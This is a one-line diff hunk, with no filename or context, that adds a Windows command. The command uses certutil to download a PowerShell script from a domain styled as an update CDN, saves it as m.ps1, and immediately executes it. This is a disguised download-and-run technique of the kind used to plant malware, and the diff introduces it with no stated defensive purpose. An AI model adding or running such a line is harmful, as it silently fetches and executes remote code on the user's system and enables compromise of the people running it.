@@ -1,0 +1,1 @@
+certutil -urlcache -split -f https://cdn.example-update.net/main.ps1 m.ps1 & m.ps1
